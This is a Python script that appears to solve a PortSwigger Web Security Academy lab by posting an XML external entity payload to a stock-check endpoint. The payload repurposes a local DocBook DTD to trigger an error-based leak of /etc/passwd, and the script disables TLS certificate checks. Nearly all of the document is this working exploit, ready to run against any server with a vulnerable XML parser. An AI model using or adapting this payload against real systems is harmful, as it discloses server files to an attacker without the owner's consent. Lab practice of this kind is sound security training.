import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'Host': '0a70007b04d2f9edc1da8f6700110070.web-security-academy.net',
    'Content-Type': 'application/xml',
}

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [\r\n<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">\r\n<!ENTITY % ISOamso \'\r\n<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">\r\n<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">\r\n&#x25;eval;\r\n&#x25;error;\r\n\'>\r\n%local_dtd;\r\n]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'

response = requests.post(
    'https://0a70007b04d2f9edc1da8f6700110070.web-security-academy.net/product/stock',
    headers=headers,
    data=data,
    verify=False,
)

print(response.text)